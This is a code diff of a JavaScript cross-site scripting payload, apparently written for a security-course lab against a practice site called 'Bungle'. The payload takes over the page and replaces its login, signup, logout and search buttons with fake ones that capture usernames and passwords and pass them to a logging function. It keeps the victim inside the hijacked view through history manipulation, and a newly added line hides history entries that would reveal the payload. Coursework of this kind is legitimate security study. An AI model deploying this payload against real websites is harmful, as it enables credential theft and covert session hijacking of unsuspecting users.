@@ -9,60 +9,64 @@ function payload(attacker) {
 	}
 
 	function fakeButton(e, destination) {
-		e.preventDefault();
-		history.pushState(destination, "", destination);
-		proxy(destination);
+		e.preventDefault(); /* do not follow the link */
+		history.pushState(destination, "", destination); /* add a new history state */
+		proxy(destination); /* render the fake HTML */
 	}
 
-	function fakeButtonPOST(e, action) {
-		e.preventDefault();
-		let destination = "./";
+	/* Used for buttons that make a POST request */
+	function fakeButtonPOST(e, action) { 
+		e.preventDefault(); /* do not follow the link */
+		let destination = "./"; /* all buttons redirect to the front page */
 		if (action == "login" || action == "create") {
-			let user = $("#username").val(), pw = $("#userpass").val();
+			let user = $("#username").val();
+			let pw = $("#userpass").val();
 			$.post("./" + action, {username: user, password: pw}, function(data) {
 				log({event: "login", user: user, password: pw});
-				proxy(destination);
+				proxy(destination); /* render the fake HTML */
 			});
 		}
 		else { /* logout */
 			let user = $("#logged-in-user").text();
 			$.post("./logout", function(data) {
 				log({event: "logout", user: user});
-				if (window.location.pathname == "/search") { /* Add a new state only when logging out from the search page */
+				if (window.location.pathname == "/search") { /* add a new history state only when logging out from the search page */
 					history.pushState(destination, "", destination);
 				}
-				proxy(destination);
+				proxy(destination); /* render the fake HTML */
 			});
 		}
 	}
 
 	function proxy(href) {
 		$("html").load(href, function(){
-			$("#bungle-lnk, #search-again-btn").click(function(e) {
+			$("#bungle-lnk, #search-again-btn").click(function(e) { /* creating fake Bungle and Search Again buttons */
 				let destination = "./";
 				fakeButton(e, destination);
 			});
 
-			$("#search-btn").click(function(e) {
-				let q = encodeURIComponent($("#query").val());
+			$("#search-btn").click(function(e) { /* creating a fake Search button */
+				let q = encodeURIComponent($("#query").val()); /* the query */
 				let destination = "./search?q=" + q;
 				fakeButton(e, destination);
 			});
 
-			$("#log-in-btn").click(function(e) {
+			$("#log-in-btn").click(function(e) { /* creating a fake Login button */
 				fakeButtonPOST(e, "login");
 			});
 
-			$("#new-account-btn").click(function(e) {
+			$("#new-account-btn").click(function(e) { /* creating a fake Create Account button */
 				fakeButtonPOST(e, "create");
 			});
 			
-			$("#log-out-btn").click(function(e) {
+			$("#log-out-btn").click(function(e) { /* creating a fake Logout button */
 				fakeButtonPOST(e, "logout");
 			});
 
-			let loggedUser = $("#logged-in-user").text();
-			loggedUser ? log({event: "nav", uri: href, user: loggedUser}) : log({event: "nav", uri: href});
+			$("a:contains('payload(')").hide(); /* hide history items containing the term "payload(" */
+
+			let loggedUser = $("#logged-in-user").text(); /* will be empty if no user is logged in */
+			loggedUser ? log({event: "nav", uri: href, user: loggedUser}) : log({event: "nav", uri: href}); /* if not empty, log the username */
 			
 			$("html").show();
 		});
@@ -70,8 +74,8 @@ function payload(attacker) {
 
 	$("html").hide();
 	history.replaceState("./", "", "./");
-	window.onpopstate = function(e) {
-		proxy(e.state);
+	window.onpopstate = function(e) { /* will fire when "back" or "forward" buttons are pressed in the browser */
+		proxy(e.state); 
 	};
 	proxy("./");
 }
